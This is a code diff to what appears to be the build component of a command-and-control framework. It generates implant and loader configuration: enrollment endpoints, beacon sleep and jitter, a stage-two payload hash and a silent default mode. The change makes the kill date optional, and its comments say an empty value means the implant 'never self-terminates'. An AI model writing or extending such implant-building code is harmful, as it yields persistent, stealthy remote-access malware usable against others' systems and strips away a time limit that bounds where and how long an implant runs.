@@ -321,7 +321,9 @@ public sealed class DotNetBuildUnit : IBuildUnit
             ["caCert"] = @params.Transport.CaPem ?? "",
             ["fallbackEnrollURLs"] = @params.Transport.FallbackEndpoints.ToArray(),
             ["mode"] = @params.Beacon.Mode,
-            ["killDate"] = @params.Beacon.KillDate.ToString("O"),
+            // Empty string is the open-ended shape: the loader reads a missing
+            // or empty kill date as "no fuse" and never self-terminates.
+            ["killDate"] = @params.Beacon.KillDate?.ToString("O") ?? "",
             ["sleep"] = ((long)@params.Beacon.Sleep.TotalSeconds).ToString() + "s",
             ["jitter"] = ((long)@params.Beacon.Jitter.TotalSeconds).ToString() + "s",
             ["enrollPath"] = @params.Transport.EnrollPath,
@@ -393,7 +395,8 @@ public sealed class DotNetBuildUnit : IBuildUnit
             ["enrollURL"] = @params.Transport.Endpoint,
             ["stage2PayloadId"] = @params.Stage2.PayloadId.ToString(),
             ["stage2Sha256"] = @params.Stage2.Sha256,
-            ["killDate"] = @params.Beacon.KillDate.ToString("O"),
+            // Empty string is the open-ended shape, same as the implant profile.
+            ["killDate"] = @params.Beacon.KillDate?.ToString("O") ?? "",
             // Same quiet default as the implant profile: a deployed loader
             // narrates nothing, and ROD_QUIET=0 preset before launch brings
             // the narration back for a debugging run.
